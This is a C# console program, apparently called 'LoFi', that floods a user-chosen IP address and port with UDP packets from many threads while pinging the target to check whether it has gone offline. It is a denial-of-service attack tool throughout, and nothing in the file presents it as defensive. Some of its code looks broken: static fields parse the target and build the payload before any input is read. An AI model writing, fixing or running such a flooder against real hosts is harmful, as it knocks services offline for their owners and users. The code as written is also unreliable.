using System;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;

namespace LoFi
{
    class Program
    {
        // Title variable
        static readonly string title = @"

              ██▓        ▒█████       █████▒    ██▓
             ▓██▒       ▒██▒  ██▒   ▓██   ▒    ▓██▒
             ▒██░       ▒██░  ██▒   ▒████ ░    ▒██▒
             ▒██░       ▒██   ██░   ░▓█▒  ░    ░██░
             ░██████▒   ░ ████▓▒░   ░▒█░       ░██░
             ░ ▒░▓  ░   ░ ▒░▒░▒░     ▒ ░       ░▓  
             ░ ░ ▒  ░     ░ ▒ ▒░     ░          ▒ ░
               ░ ░      ░ ░ ░ ▒      ░ ░        ▒ ░
                 ░  ░       ░ ░                 ░  
                                      ";


        // Parameter Variables
        static string address; // This variable acts as the target
        static string payload; // This variable is the input on how many bytes of data should be sent in a packet
        static string delayer; // This variable handles the delay between packet launches
        static string netport; // This variable handles the port number which should be attacked
        static string pingers; // This variable handles the delay between ICMP Echo requests.

        // Payload parsed value
        static string parseload = "";

        // Attacking objects
        // Create a new socket for UDP packet attack
        static Socket flooder = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
        static byte[] floodload = Encoding.ASCII.GetBytes(parseload);
        static IPEndPoint endpoint = new(IPAddress.Parse(address), int.Parse(netport));
        // Create integers used in attacking process
        static int i = 0; // Used for ICMP Echo control
        static int j = 0; // Used for threading control
        static int pluscolor = 1; // Used to control text color
        static int packets = 0; // Used to count the total packets sent
        static void Main(string[] args)
        {
            // Set console size and color
            Console.SetWindowSize(65, 25);
            Console.BackgroundColor = ConsoleColor.Black;


            // Write titles
            Color(6);
            Console.Clear();
            Console.Title = "♫  L O F I  ( v 1 . 1 )  ♫";
            Console.WriteLine(title);
            Color(0);

            // Set parameters
            Parameters("Enter the IP Address of your target.", 1);
            Parameters("Enter the port number of your target.", 2);
            Parameters("Enter your desired packet size (bytes).", 3);
            Parameters("Enter your desired UDP packet delay (milliseconds).", 4);
            Parameters("How often would you like to test your connection?", 5);
            Parameters("How many threads would you like to attack with?", 6);

            // Convert payload parameter to how many zeroes represented in the variable
            for (int i = 0; i < int.Parse(payload); i++)
            {
                parseload += "0";
            }

            // Attack the target
            Attack();
        }

        // Set parameters
        static void Parameters(string question, int switcher)
        {
            Color(4);
            Console.Write("╔═ ");
            Color(6);
            Console.Write("♫ ");
            Color(0);
            Console.Write(question);
            Color(6);
            Console.Write(" ♫");
            Console.WriteLine();
            Color(4);
            Console.Write("╚══ ");
            Color(0);
            string input = Console.ReadLine();

            // Actually assign the input to the parameters
            switch (switcher)
            {
                case 1:
                    address = input;
                    break;
                case 2:
                    netport = input;
                    break;
                case 3:
                    payload = input;
                    break;
                case 4:
                    delayer = input;
                    break;
                case 5:
                    pingers = input;
                    break;
                case 6:
                    j = int.Parse(input);
                    break;
            }
        }

        // Attack the target
        static void Attack()
        {
            Console.WriteLine();

            // Animates the title
            Thread animation = new(Animation);
            animation.Start();

            // Start threads
            for (int i = 0; i < j; i++)
            {
                Thread threads = new(Barrager);
                threads.Start();
            }

            // Loop attack process
            while (true)
            {

                if (i == int.Parse(pingers))
                {
                    // Do some garbage collection
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    GC.Collect();

                // Ping target to check if it's still online
                pingattempt:
                    Color(pluscolor);
                    Ping pingSender = new();
                    byte[] buffer = Encoding.ASCII.GetBytes("abcdefghijklmnopqrstuvwabcdefghi");
                    int timeout = 10000;
                    PingOptions options = new(64, true);
                    try
                    {
                        // Print offline message and/or packet diagnostics
                        PingReply reply = pingSender.Send(address, timeout, buffer, options);
                        if (reply.Status == IPStatus.Success)
                        {
                            Console.WriteLine("♫ Pinged : " + address + " : " + netport + " : TTL " + reply.Options.Ttl + "ms : RT " + reply.RoundtripTime + "MS : " + packets + "*" + payload);
                            i = 0;
                        }
                        else
                        {
                            Color(0);
                            Console.WriteLine("♫  O F F L I N E  ♫");
                            Console.Beep();
                            goto pingattempt;
                        }

                        pluscolor++;
                        if (pluscolor == 7)
                        {
                            pluscolor = 1;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex);
                    }
                }

                // Delay packets
                Thread.Sleep(int.Parse(delayer));
            }
        }

        static void Barrager()
        {
            while (true)
            {
                if (i != int.Parse(pingers))
                {
                    // Attempt to send UPD packet
                    try
                    {
                        flooder.SendTo(floodload, endpoint);
                        packets++;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex);
                    }
                    i++;
                }
            }
        }

        // Color changing algorithm
        static void Color(int value)
        {
            switch (value)
            {
                case 0:
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
                case 1:
                    Console.ForegroundColor = ConsoleColor.Red;
                    break;
                case 2:
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    break;
                case 3:
                    Console.ForegroundColor = ConsoleColor.Green;
                    break;
                case 4:
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    break;
                case 5:
                    Console.ForegroundColor = ConsoleColor.Blue;
                    break;
                case 6:
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    break;
            }
        }

        // Animates the title
        static void Animation()
        {
            while (true)
            {
                Console.Title = "♫ A T T A C K I N G";
                Thread.Sleep(150);
                Console.Title = "♫ A T T A C K I N G .";
                Thread.Sleep(150);
                Console.Title = "♫ A T T A C K I N G . .";
                Thread.Sleep(150);
                Console.Title = "♫ A T T A C K I N G . . .";
                Thread.Sleep(150);
            }
        }
    }
}
